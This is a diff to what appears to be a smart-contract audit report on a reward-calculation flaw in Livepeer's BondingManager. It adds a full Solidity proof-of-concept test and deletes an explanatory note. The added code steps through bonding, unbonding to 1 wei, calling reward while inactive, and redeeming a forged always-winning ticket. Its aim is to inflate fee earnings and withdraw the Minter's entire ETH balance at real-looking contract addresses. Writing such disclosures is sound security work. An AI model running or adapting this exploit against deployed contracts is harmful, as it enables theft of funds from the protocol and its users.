@@ -103,9 +103,6 @@ activeCumulativeRewards: This value comes from t.cumulativeRewards and increases
 
 totalStake: Represents the total stake in the earnings pool, which must also increase by at least the same amount as activeCumulativeRewards. This is because the cumulative rewards of a transcoder are considered bonded stake.
 
-### Important Note
-If activeCumulativeRewards ever becomes greater than totalStake, the calculation becomes inaccurate. This is because the formula would effectively apply a multiplier greater than 1.0, resulting in inflated rewards.
-
 
 ### POC
 
@@ -139,3 +136,113 @@ If activeCumulativeRewards ever becomes greater than totalStake, the calculation
 
 10. **Drain Funds**:  
     - Use `withdrawFees` to withdraw the entire balance from the **Minter**, draining its funds.
+
+
+
+
+### Coded POC
+
+
+```solidity
+contract PoC is Test {
+
+    LivepeerToken  lpt = LivepeerToken (0x289ba1701C2F088cf0faf8B3705246331cB8A839);
+    BondingManager bm  = BondingManager(0x35Bcf3c30594191d53231E4FF333E8A770453e40);
+    TicketBroker   tb  = TicketBroker  (0xa8bB618B1520E284046F3dFc448851A1Ff26e41B);
+    RoundsManager  rm  = RoundsManager (0xdd6f56DcC28D3F5f27084381fE8Df634985cc39f);
+
+    address constant MINTER = 0xc20DE37170B45774e6CD3d2304017fc962f27252;
+
+    address TICKET_SENDER;
+    uint    TICKET_SENDER_KEY = 31337;
+
+    function setUp() public {
+        // Fund the attacker with 4010 LPT to main contract
+        vm.prank(MINTER);
+        lpt.transfer(address(this), 4010 ether);
+        // which in turn funds the second contract with 10 LPT
+        lpt.transfer(address(0x1337), 10 ether);
+
+        TICKET_SENDER = vm.addr(TICKET_SENDER_KEY);
+    }
+
+    function test_poc() public {
+        // Check start balance
+        console.log("\n{\t[+] Start state\n\t\tMinter balance: %4e ETH\n}", MINTER.balance / 1e14);
+
+        // Bond 4000 LPT from the attacker, enough to become an active transcoder in the forked block
+        lpt.approve(address(bm), type(uint).max);
+        bm.bond(4000 ether, address(this));
+        // Set reward and fee cut rate such that the transcoder gets all rewards but delegators get all fees
+        bm.transcoder(1e6, 1e6);
+
+        // Wait for the next round
+        _nextRound();
+
+        // Unbond all LPT except 1 wei, such that the transcoder becomes the last active transcoder wth 1 wei stake.
+        bm.unbond(4000 ether - 1 wei);
+        
+        // Secondary attacker contract now bonds with the 10 LPT, kicking the main contract out of the active transcoders
+        vm.startPrank(address(0x1337));
+        lpt.approve(address(bm), type(uint).max);
+        bm.bond(10 ether, address(0x1337));
+        vm.stopPrank();
+
+        // Main attacker now calls reward in the last active round, which will increase the activeCumulativeRewards but not the total stake of the next round (because they're not active anymore)
+        bm.reward();
+
+        // Wait for the next round
+        _nextRound();
+
+        // Prepare a always-winning ticket of 1 ETH to the main attacker contract
+        MTicketBrokerCore.Ticket memory ticket = MTicketBrokerCore.Ticket({
+            recipient: address(this),
+            sender: TICKET_SENDER,
+            faceValue: 1 ether,
+            winProb: type(uint).max,
+            senderNonce: 1,
+            recipientRandHash: keccak256(abi.encodePacked(uint(1337))),
+            auxData: abi.encodePacked(rm.currentRound(), rm.blockHashForRound(rm.currentRound()))
+        });
+
+        // Sign it
+        bytes32 ticketHash = keccak256(abi.encodePacked(
+            ticket.recipient,
+            ticket.sender,
+            ticket.faceValue,
+            ticket.winProb,
+            ticket.senderNonce,
+            ticket.recipientRandHash,
+            ticket.auxData
+        ));        
+        bytes32 signHash = keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", ticketHash));
+        (uint8 v, bytes32 r, bytes32 s) = vm.sign(TICKET_SENDER_KEY, signHash);
+        
+        // Ticket sender needs to deposit the assets (they'll be stolen back later)
+        payable(TICKET_SENDER).transfer(1 ether);
+        vm.prank(TICKET_SENDER);
+        tb.fundDeposit{value: 1 ether}();
+
+        // Now redeeming the ticket will give 1 ETH in fees to the main attacker
+        // which will be multiplied with a huge multiplier due to the stake being 1 wei and the
+        // activeCumulativeRewards being much higher.
+        tb.redeemWinningTicket(ticket, abi.encodePacked(r, s, v), 1337);
+
+        // Convert to actual fees
+        bm.claimEarnings(0);
+
+        // And withdraw the entire Minter's ETH balance
+        bm.withdrawFees(payable(address(this)), MINTER.balance);
+
+        // gg wp
+        console.log("\n{\t[+] Final state\n\t\tMinter balance: %4e ETH\n}", MINTER.balance / 1e14);
+    }
+
+    function _nextRound() private {
+        vm.roll(block.number + 6377);
+        rm.initializeRound();
+    }
+
+    receive() external payable {}
+}
+```
